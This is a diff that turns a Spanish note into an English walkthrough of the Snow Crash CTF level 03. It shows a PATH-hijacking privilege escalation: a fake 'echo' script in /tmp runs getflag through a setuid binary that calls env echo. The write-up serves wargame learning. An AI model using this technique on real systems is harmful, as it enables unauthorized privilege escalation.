@@ -1,16 +1,66 @@
-# executable decompiler
-Hemos encontrado un ejecutable llamado level03 al hacerle un cat hemos encontrado codigo compilado en C.
-Hemos usados una herramienta para obtener el codigo fuente original donde hemos visto esta linea:
-return system("/usr/bin/env echo Exploit me");
+# Snow Crash - Level 03
 
-El programa env utiliza $PATH para buscar donde esta el comando echo. Busca en orden y el primero que encuentra lo ejecuta.
-Podemos engañar al programa añadiendo al principio del $PATH un directorio con nuestro propio echo.
-Gracias a esto:
+## Finding the Executable
+
+We find an executable named `level03`. To inspect its contents, we use the following command:
+
+```bash
+cat level03
+```
+
+The output reveals compiled C code. Using a decompiler, we retrieve the original source code, which includes the following line:
+
+```c
+return system("/usr/bin/env echo Exploit me");
+```
+
+## Understanding the Exploit
+
+The `env` command uses the `$PATH` variable to locate `echo`. It executes the first matching instance found in the directories listed in `$PATH`. By manipulating `$PATH`, we can execute our own `echo` command instead of the system’s default.
+
+Additionally, the program runs with the permissions of its owner, `flag03`, as confirmed by the following code:
+
+```c
 v1 = getegid();
-    v2 = geteuid();
-    v0 = v1;
-    setresgid(v1, v1);
-    v0 = v2;
-    setresuid(v2, v2);
-Se ejecuta con los permisos del dueño del archivo que este caso es flag03.
-Por ejemplo al escribir en el archivo "whoami" te devuelve flag03. Por lo tanto al ejecutar "getflag" lo hace como si fuera flag03 y te devuelve la contraseña. 
+v2 = geteuid();
+v0 = v1;
+setresgid(v1, v1);
+v0 = v2;
+setresuid(v2, v2);
+```
+
+## Exploiting the Vulnerability
+
+To escalate privileges, we create a custom `echo` script that runs `getflag` and place it in a directory we control. We then modify `$PATH` to prioritize this directory.
+
+### Steps:
+
+1. Create a new directory and navigate into it:
+
+   ```bash
+   mkdir /tmp/exploit
+   cd /tmp/exploit
+   ```
+
+2. Create a fake `echo` script:
+
+   ```bash
+   echo "#!/bin/bash" > echo
+   echo "getflag" >> echo
+   chmod +x echo
+   ```
+
+3. Modify the `$PATH` variable:
+
+   ```bash
+   export PATH=/tmp/exploit:$PATH
+   ```
+
+4. Run the vulnerable executable:
+
+   ```bash
+   ./level03
+   ```
+
+This executes `getflag` with `flag03`'s permissions, retrieving the flag.
+
